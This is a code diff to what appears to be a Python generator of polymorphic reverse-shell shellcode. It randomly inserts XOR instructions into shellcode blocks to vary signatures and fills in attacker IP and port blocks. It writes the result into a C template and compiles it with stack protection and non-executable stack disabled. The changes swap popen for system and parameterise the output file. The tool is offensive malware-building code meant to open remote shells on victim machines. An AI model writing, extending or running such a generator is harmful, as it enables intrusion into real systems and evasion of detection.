@@ -1,4 +1,4 @@
-from os import popen
+from os import system
 from json import load
 from random import randint
 from pathlib import Path
@@ -104,13 +104,16 @@ def oprand(preshellcode_reg1_reg2: dict, xor_nb: int) -> str:
     if blocs[-1] == '':
         blocs.pop()
 
+    randxor = ""
     while randxor_putted < xor_nb:
-        
-        # generate a random index that will be use to retrieve a random element of the xor_dict
         xorandindex = randint(0, len(xor_keys) - 1)
         blocsrandindex = randint(0, len(blocs) - 1)
         randxor = xor_dict[xor_keys[xorandindex]]
-
+        # generate a random index that will be use to retrieve a random element of the xor_dict
+        while randxor in ['r11', 'r13', 'r14']:
+            xorandindex = randint(0, len(xor_keys) - 1)
+            blocsrandindex = randint(0, len(blocs) - 1)
+            randxor = xor_dict[xor_keys[xorandindex]]
         # retrieve a random xor_dict element that will be put randomly in the shellcode blocs N times (random)
         blocs[blocsrandindex] =  randxor + blocs[blocsrandindex]
         randxor_putted += 1
@@ -119,7 +122,7 @@ def oprand(preshellcode_reg1_reg2: dict, xor_nb: int) -> str:
     baseshell_modified = '0f05'.join(blocs) + '0f05'
     return baseshell_modified
 
-def shellcode(baseshell: str, ipbloc: str, portbloc: str, xor_nb: int) -> str:
+def shellcode(baseshell: str, ipbloc: str, portbloc: str, xor_nb: int, outfile: str) -> str:
     """
     Function that create the shellcode.
     This function call regreplace() and oprand() to do it.
@@ -150,7 +153,7 @@ def shellcode(baseshell: str, ipbloc: str, portbloc: str, xor_nb: int) -> str:
     
 
     # save the shellcode in reverse_shell.c and shellcode.txt so that it can be compiled after of use in another purpose
-    outfile = 'reverse_shell.c'
+    cfile = 'reverse_shell.c'
     ccode = open(c_template, 'r').read()
     ccode = ccode.replace('0', repr(shellcode).replace("'", '"'))
 
@@ -162,9 +165,9 @@ def shellcode(baseshell: str, ipbloc: str, portbloc: str, xor_nb: int) -> str:
             print("==============================================================\n")
             break
 
-    with open(outfile, 'w') as out:
+    with open(cfile, 'w') as out:
         out.write(ccode.replace(r'\\', '\\'))
-    with open('shellcode.txt', 'w') as outshellcode:
+    with open(outfile, 'w') as outshellcode:
         outshellcode.write(shellcode)
 
     return shellcode
@@ -175,4 +178,4 @@ def compile():
     Compile the C file
     """
 
-    popen(f'gcc reverse_shell.c -o reverse_shell -fno-stack-protector -z execstack -no-pie')
+    system(f'gcc reverse_shell.c -o reverse_shell -fno-stack-protector -z execstack -no-pie')
